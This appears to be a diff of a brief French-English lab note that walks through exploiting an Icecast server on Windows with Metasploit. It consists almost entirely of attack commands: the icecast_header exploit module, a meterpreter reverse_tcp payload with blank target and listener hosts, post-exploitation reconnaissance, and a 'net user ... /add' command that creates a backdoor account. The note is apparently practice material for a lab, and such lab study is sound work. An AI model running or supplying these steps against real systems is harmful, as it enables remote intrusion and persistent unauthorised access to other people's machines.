@@ -1,16 +1,18 @@
-run icecast en admin sur le windows
+# lab  
 
-lab
-	smfconsole
-	search icecast
-	use exploit/windows/http/icecast_header
-	set payload windows/meterpreter/reverse_tcp
-	set rhost
-	set lhost
+## run icecast en admin sur le windows
+
+
+	smfconsole  
+	search icecast  
+	use exploit/windows/http/icecast_header  
+	set payload windows/meterpreter/reverse_tcp  
+	set rhost  
+	set lhost  
 	
-	sysinfo
-	getuid
-	ps
+	sysinfo  
+	getuid  
+	ps  
 	
 	shell
 	net user <user> passwors /add
